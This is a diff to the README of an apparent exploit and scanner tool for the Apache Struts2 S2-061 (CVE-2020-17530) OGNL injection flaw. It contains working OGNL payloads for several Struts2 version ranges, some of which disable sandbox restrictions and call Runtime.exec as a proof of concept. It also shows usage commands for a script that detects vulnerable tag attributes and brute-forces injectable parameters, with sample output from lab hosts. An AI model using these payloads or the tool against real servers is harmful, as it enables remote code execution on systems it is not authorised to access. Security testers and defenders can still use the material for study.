@@ -97,10 +97,10 @@ tag_input = {'accept', 'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssEr
 payload :
 ```
 2.0.0~2.3.29 poc: 
-`%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))} 
-` 
+%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))} 
+ 
 2.3.30~2.3.37/2.5~2.5.13:
-`%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))}` 
+%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))}
  
 2.5.14.1~2.5.16:
 %{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))} 
@@ -112,14 +112,25 @@ new version @ka1n4t  https://github.com/ka1n4t/CVE-2020-17530 ：
 
 ```
 
-## update 2020.12.14
+### update 2020.12.14
 加入了检测脚本，只需要检测自定义属性即可，写并发的时候出了几个bug（菜 ，没有提供爆破接口，所以就给单个的吧
+### update 2020.12.14 晚
+加了爆破功能
 ```
-python S2_061.py -u url
+爆破自定义参数功能，需要在当前目录下放置一个名为dict.txt的字典，字典可选用api的：
+python S2_061.py -u http://192.168.31.166:8999/Struts2_5_1_war_exploded/S2059.action  -b
 
-output:
-Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/;jsessionid=1E0F7E27DE745DA313D570F662C529E3" pulsar=""></a>
-Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/;jsessionid=1E0F7E27DE745DA313D570F662C529E3" id="123" pulsar=""></a>
-http://192.168.1.50:8999/Struts2_5_1_war_exploded/ exists S2-061，vulnerable tag is [<a href="/Struts2_5_1_war_exploded/;jsessionid=1E" pulsar=""></a>, <a href="/Struts2_5_1_war_exploded/;jsessionid=1E" id="123" pulsar=""></a>]
+output：
+['skillName']
+Found S2-061! Customize parameter is: skillName  !
+
+探测自定义属性功能：
+python S2_061.py  -u http://192.168.31.166:8999/Struts2_5_1_war_exploded/S2059.action
+
+output：
+Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/S2059.action;jsessionid=CF87ECC18EF592A5F08B13EA9BC7FE3C" pulsar=""></a>
+Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/S2059.action;jsessionid=CF87ECC18EF592A5F08B13EA9BC7FE3C" id="123" pulsar=""></a>
+Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/S2059.action;jsessionid=CF87ECC18EF592A5F08B13EA9BC7FE3C" id="12323" pulsar=""></a>
+http://192.168.31.166:8999/Struts2_5_1_war_exploded/S2059.action exists S2-061，vulnerable tag is [<a href="/Struts2_5_1_war_exploded/S2059.action;jsessionid=CF87ECC18EF592A5F08B13EA9BC7FE3C" pulsar=""></a>, <a href="/Struts2_5_1_war_exploded/S2059.action;jsessionid=CF87ECC18EF592A5F08B13EA9BC7FE3C" id="123" pulsar=""></a>, <a href="/Struts2_5_1_war_exploded/S2059.action;jsessionid=CF87ECC18EF592A5F08B13EA9BC7FE3C" id="12323" pulsar=""></a>]
 
 ```
